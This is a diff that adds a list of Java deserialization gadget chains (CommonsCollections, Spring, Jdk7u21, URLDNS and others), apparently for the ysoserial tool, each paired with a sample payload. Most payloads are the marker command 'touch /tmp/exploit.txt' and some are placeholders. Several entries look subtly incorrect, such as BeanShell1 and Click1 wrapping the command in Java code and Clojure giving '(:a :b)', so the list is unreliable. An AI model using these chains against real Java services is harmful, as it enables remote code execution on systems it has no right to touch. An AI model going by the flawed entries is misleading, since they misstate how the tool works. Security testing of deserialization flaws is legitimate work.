@@ -1,0 +1,100 @@
+AspectJWeaver:
+payload = "filename:base64_encoded_payload"
+
+BeanShell1:
+payload = 'bsh.Interpreter("java.lang.Runtime.getRuntime().exec(\'touch /tmp/exploit.txt\')")'
+
+C3P0:
+payload = 'touch /tmp/exploit.txt'
+
+Click1:
+payload = 'java.lang.ProcessBuilder(["/bin/bash","-c","touch /tmp/exploit.txt"]).start()'
+
+Clojure:
+payload = '(:a :b)'
+
+CommonsCollections1:
+payload = 'touch /tmp/exploit.txt'
+
+CommonsCollections2:
+payload = 'touch /tmp/exploit.txt'
+
+CommonsCollections3:
+payload = 'touch /tmp/exploit.txt'
+
+CommonsCollections4:
+payload = 'touch /tmp/exploit.txt'
+
+CommonsCollections5:
+payload = 'touch /tmp/exploit.txt'
+
+CommonsCollections6:
+payload = 'touch /tmp/exploit.txt'
+
+CommonsCollections7:
+payload = 'touch /tmp/exploit.txt'
+
+FileUpload1:
+payload = 'touch /tmp/exploit.txt'
+
+Groovy1:
+payload = 'touch /tmp/exploit.txt'
+
+Hibernate1:
+payload = 'touch /tmp/exploit.txt'
+
+Hibernate2:
+payload = 'touch /tmp/exploit.txt'
+
+JBossInterceptors1:
+payload = 'touch /tmp/exploit.txt'
+
+JRMPClient:
+payload = 'command_to_execute'
+
+JRMPListener:
+This payload is used to set up a listener for
+remote code execution rather than providing a
+specific payload example.
+
+JSON1:
+payload = 'command_to_execute'
+
+JavassistWeld1:
+payload = 'touch /tmp/exploit.txt'
+
+Jdk7u21:
+payload = 'touch /tmp/exploit.txt'
+
+Jython1:
+payload = 'touch /tmp/exploit.txt'
+
+MozillaRhino1:
+payload = 'touch /tmp/exploit.txt'
+
+MozillaRhino2:
+payload = 'touch /tmp/exploit.txt'
+
+Myfaces1:
+payload = 'touch /tmp/exploit.txt'
+
+Myfaces2:
+payload = 'touch /tmp/exploit.txt'
+
+ROME:
+payload = 'touch /tmp/exploit.txt'
+
+Spring1:
+payload = 'touch /tmp/exploit.txt'
+
+Spring2:
+payload = 'touch /tmp/exploit.txt'
+
+URLDNS:
+payload = 'your_domain_here'
+
+Vaadin1:
+payload = 'touch /tmp/exploit.txt'
+
+Wicket1:
+payload = 'touch /tmp/exploit.txt'
